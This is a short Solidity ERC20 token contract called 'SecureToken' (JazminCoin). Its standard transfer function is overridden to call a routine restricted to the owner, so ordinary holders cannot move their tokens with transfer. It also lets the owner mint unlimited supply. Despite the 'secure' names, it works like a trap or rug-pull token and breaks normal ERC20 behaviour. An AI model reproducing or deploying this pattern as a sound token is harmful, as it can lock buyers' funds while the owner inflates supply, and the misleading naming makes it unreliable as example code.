// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts@4.9.0/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts@4.9.0/access/Ownable.sol";

contract SecureToken is ERC20, Ownable {
    constructor(uint256 initialSupply) ERC20("JazminCoin", "JZMN") {
        _mint(msg.sender, initialSupply);
    }

    function secureMint(uint256 amount) public onlyOwner {
        _mint(msg.sender, amount);
    }

    function secureBurn(uint256 amount) public {
        require(amount > 0, "Amount must be greater than 0");
        require(balanceOf(msg.sender) >= amount, "Insufficient balance");
        
        _burn(msg.sender, amount);
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        secureTransfer(recipient, amount);
        return true;
    }

    function secureTransfer(address recipient, uint256 amount) public onlyOwner returns (bool) {
        require(amount > 0, "Amount must be greater than 0");
        require(balanceOf(_msgSender()) >= amount, "Insufficient balance");
        
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
}
